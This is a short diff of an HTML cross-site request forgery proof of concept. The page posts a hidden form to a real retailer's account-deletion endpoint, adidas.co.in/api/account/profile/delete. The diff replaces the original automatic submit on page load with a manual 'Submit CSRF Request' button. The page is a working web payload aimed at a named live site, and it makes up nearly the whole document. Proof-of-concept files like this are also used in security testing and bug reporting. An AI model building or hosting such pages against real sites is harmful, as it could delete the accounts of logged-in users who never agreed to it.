@@ -4,14 +4,11 @@
     <meta charset="utf-8">
     <title>CSRF PoC — simple POST</title>
   </head>
-  <body onload="document.forms[0].submit()">
+  <body>
+    <h2>CSRF PoC — Simple POST</h2>
     <form action="https://www.adidas.co.in/api/account/profile/delete" method="POST">
-      <!-- default form fields (may be ignored by server) -->
       <input type="hidden" name="payload" value="{}">
-      <noscript>
-        <p>Javascript disabled — click submit to run the PoC.</p>
-        <button type="submit">Submit</button>
-      </noscript>
+      <button type="submit">Submit CSRF Request</button>
     </form>
   </body>
 </html>
